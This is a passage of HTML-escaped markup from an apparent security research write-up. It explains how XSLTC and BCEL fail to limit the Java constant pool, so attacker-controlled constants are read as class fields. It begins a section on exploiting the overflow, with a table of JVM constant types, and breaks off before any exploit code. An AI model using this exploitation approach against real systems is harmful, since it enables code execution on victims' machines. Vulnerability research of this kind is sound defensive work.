pre-wrap;\"&gt;value&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;))&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;instruction &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;new&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; SIPUSH&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;((&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;short&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;)&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; value&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;else&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;instruction &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;=&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; &lt;/span&gt;&lt;span style=\"background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;new&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; LDC&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;cp&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;addInteger&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&lt;/span&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;value&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;));&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=\"background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The problem with this approach is that neither XSLTC nor BCEL correctly limits the size of the constant pool. As &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;constant_pool_count&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;, which describes the size of the constant pool, is only 2 bytes long, its maximum size is limited to 2**16 - 1 or 65535 entries. In practice even fewer entries are possible, because some constant types take up two entries. However, BCELs internal constant pool representation uses a standard Java Array for storing constants, and does not enforce any limits on its length.&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;When XSLTC processes a stylesheet that contains more constants, and BCELs internal class representation is serialized to a class file at the end of the compilation process the array length is truncated to a short, but the complete array is written out:&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;This means that &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;constant_pool_count&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; will now contain a small value and that parts of the attacker-controlled constant pool will get interpreted as the class fields following the constant pool, including method and attribute definitions.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Exploiting a constant pool overflow&lt;/span&gt;&lt;/h2&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;To understand how we can exploit this, we first need to take a closer look at the content of the constant pool.&amp;nbsp; Each entry in the pool starts with a 1-byte tag describing the kind of constant, followed by the actual data. The table below shows an incomplete list of constant types supported by the JVM (see the &lt;/span&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4:~:text=Table%C2%A04.4%2DB.%C2%A0Constant%20pool%20tags%20(by%20tag)\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;official documentation&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; for a complete list). No need to read through all of them but we will come back to this table a lot when walking through the exploit.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;div align=\"left\" dir=\"ltr\" style=\"margin-left: 0.75pt;\"&gt;&lt;table style=\"border-collapse: collapse; border: none;\"&gt;&lt;colgroup&gt;&lt;col width=\"210\"&gt;&lt;/col&gt;&lt;col width=\"37\"&gt;&lt;/col&gt;&lt;col width=\"114\"&gt;&lt;/col&gt;&lt;col width=\"251\"&gt;&lt;/col&gt;&lt;/colgroup&gt;&lt;tbody&gt;&lt;tr style=\"height: 24.25pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;Constant Kind&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;Tag&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;Description&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;Layout&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 23.5pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.7\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Utf8&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Constant variable-sized UTF-8 string value&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Utf8_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u2 length;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 bytes[length];&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 23.5pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.4\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Integer&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;3&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;4-byte integer&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Integer_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u4 bytes;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 23.5pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.4\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Float&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;4&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;4-byte float&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CONSTANT_Float_info {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u1 tag;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;u4 bytes;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"background-color: transparent; font-family: &amp;quot;Roboto Mono&amp;quot;, monospace; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"height: 23.5pt;\"&gt;&lt;td style=\"background-color: white; border-bottom: solid #808080 0.75pt; border-left: solid #808080 0.75pt; border-right: solid #808080 0.75pt; border-top: solid #808080 0.75pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;\"&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;a href=\"https://docs.oracle.com/javase/specs/jvms/se18/html/jvms-4.html#jvms-4.4.1\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"background-color: transparent; color: #1155cc; font-family: Arial; font-size: 9pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: 